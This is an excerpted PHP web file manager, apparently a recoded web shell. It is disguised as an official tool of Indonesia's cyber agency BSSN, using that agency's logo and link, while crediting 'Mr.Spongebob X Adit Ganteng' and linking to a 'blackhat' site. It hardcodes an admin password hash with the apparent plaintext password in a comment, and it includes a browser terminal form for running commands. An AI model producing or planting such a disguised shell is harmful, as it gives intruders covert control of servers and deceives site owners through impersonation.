...
/**
 * System | File Manager BSSN
 * @author BSSN @2025
 * @email kangpepes@protonmail.com
 * @Recode By Mr.Spongebob X Adit Ganteng
...
$use_auth = true;
$auth_users = array(
    'adm' => '$2a$12$DQ4uND4JYpmWbjYWh/yRwua3I4Kq.Q.7TJNmcui2/HZM.DbxB83wi', //adminsange
);
                ...
                <div class="row justify-content-md-center h-100">
                    <div class="card-wrapper">
                                    ...
                                    <div class="mb-3">
                                       <div class="brand">
                                        ...
                                        <div class="text-center">
                                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Logo_BSSN_new.png/600px-Logo_BSSN_new.png" alt="Image Description" style="display: block; margin: 0 auto; max-width: 65%; height: auto; margin-bottom: 10px;">
                        ...
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="" target="_blank" class="text-decoration-none text-muted" data-version="<?php echo VERSION; ?>">BSSN @2025</a> &mdash;&mdash;
                        </div>
                    </div>
                </div>
            </div>
...
if (isset($_GET['info'])) {
    ...
    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php echo fm_get_theme(); ?>">
            <h6 class="card-header d-flex justify-content-between">
                <span><i class="fa fa-exclamation-circle"></i> <?php echo lng('info') ?></span>
                <a href="?p=<?php echo FM_PATH ?>" class="text-danger"><i class="fa fa-times-circle-o"></i> <?php echo lng('Cancel')?></a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h4><a href="https://www.bssn.go.id/" target="_blank" class="app-v-title"> File Manager BSSN <?php echo VERSION; ?></a></h4></p>
                        <h4>Recode By Mr.Spongebob X Adit Ganteng</h4>
                        <h4>Mail Us: <a href="mailto:kangpepes@protonmail.com">kangpepes@protonmail.com</a> </h4>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://www.sukabumiblackhat.com" target="_blank"><i class="fa fa-question-circle"></i> <?php echo lng('info Documents') ?> </a> </li>
                                <li class="list-group-item"><a href="https://www.sukabumiblackhat.com" target="_blank"><i class="fa fa-bug"></i> <?php echo lng('Report Issue') ?></a></li>
                                <?php if(!FM_READONLY) { ?>
                ...
                <ul class="navbar-nav justify-content-end <?php echo fm_get_theme();  ?>">
                    ...
                    <li class="nav-item avatar dropdown">
                        ...
                        <div class="dropdown-menu text-small shadow <?php echo fm_get_theme(); ?>" aria-labelledby="navbarDropdownMenuLink-5">
                            ...
                            <?php endif ?>
                            <a title="<?php echo lng('info') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;info=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php echo lng('info') ?></a>
...
<script>
    $(document).ready(function() {
        $('#terminalForm').on('submit', function(e) {
            ...
            if (input === "") {
                $('#terminalOutput').text("Please enter a command.");
                return;
            }
...
function lng($txt) {
    ...
    $tr['en']['info']           = 'info';                   $tr['en']['Created']            = 'Created';
    $tr['en']['info Documents'] = 'info Documents';         $tr['en']['Report Issue']       = 'Report Issue';
